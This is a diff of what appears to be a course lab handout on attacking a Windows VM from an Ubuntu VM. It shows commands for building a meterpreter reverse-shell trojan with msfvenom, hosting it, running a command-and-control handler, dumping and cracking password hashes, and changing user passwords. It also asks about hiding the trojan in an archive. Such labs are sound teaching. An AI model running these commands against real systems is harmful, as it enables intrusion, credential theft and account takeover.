@@ -34,17 +34,17 @@ You may follow this [installation video]()
 *Note: replace VM IPs with yours in these tasks*
 
 1. (5%) Find the IP addresses of your Windows server VM and Ubuntu VM, make sure they can ping each other
-2.  (10%) On Ubuntu, create a trojan program with msfvenom
+2.  (5%) On Ubuntu, create a trojan program with msfvenom
     ```bash
     # Replace the Ubuntu_IP with yours
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=Ubuntu_IP LPORT=12345 -f exe > trojan.exe
     ```
-3. (10%) On Ubuntu, host trojon.exe with Python built-in SimpleHTTPServer
+3. (5%) On Ubuntu, host trojon.exe with Python built-in SimpleHTTPServer
    ```bash
    # Run the command below from the folder contains trojan.exe
    sudo python3 -m http.server 80
    ```
-4. (20%) On Ubuntu, starting a Command-and-Control (C&C) Server
+4. (10%) On Ubuntu, starting a Command-and-Control (C&C) Server
    ```bash
    # Inside msfconsole, replace the Ubuntu_IP with yours
    use multi/handler
@@ -89,6 +89,25 @@ You may follow this [installation video]()
    # 5. Check network connections on the victim machine from meterpreter
    netstat
    ```
+11. (20%) Cracking and changing Windows password.
+    1. (10%) Dump the hash values of all saved passwords of all windows users, then crack with John the Ripper.
+    ```bash
+    # Inside meterpreter
+    # 1. dump the hashes
+    hashdump # save the result in a text file
+    # 2. crack the hashes
+    john --wordlist=pass_dict.txt --format=NT hashes.txt
+    ```
+    2. (10%) Change Windows users' password. Use a user found above, replace oldpass and newpass with yours
+    ```bash
+    # Inside msf
+    msf > use post/windows/manage/change_password
+    msf post(change_password) > set smbuser user_name
+    msf post(change_password) > set old_password oldpass
+    msf post(change_password) > set new_password newpass
+    msf post(change_password) > set session 1
+    msf post(change_password) > exploit
+    ```
 
 ### 3. Review questions (Optional)
 1. Hide trojan.exe in a self-extract archive.
@@ -120,3 +139,8 @@ You may follow this [installation video]()
 * [Autorun.inf Maker](http://www.ashzfall.com/products/autorun/index.html)
   * [How do I test autorun.inf files without wasting CD's?](http://www.ashzfall.com/products/autorun/autorunfloppy.html)
   * [How to Auto-Run Windows Programs When You Plug In a USB Drive](https://www.howtogeek.com/326049/how-to-auto-run-windows-programs-when-you-plug-in-a-usb-drive/)
+* [meterpreter basics](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
+  * [Quick Meterpreter and Metasploit tutorial - Stealing hashes and passwords, Keyloggers, Webcams and other post-exploitation modules](http://www.ethicalpentest.com/2018/03/meterpreter-metasploit-tutorial-part2.html)
+  * [Post Exploitation for Remote Windows Password](https://www.hackingarticles.in/post-exploitation-remote-windows-password/)
+  * [Dumping Domain Password Hashes](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
+  * [Cracking Windows Password Hashes with Hashcat](https://samsclass.info/123/proj14/123p12winhash.htm)
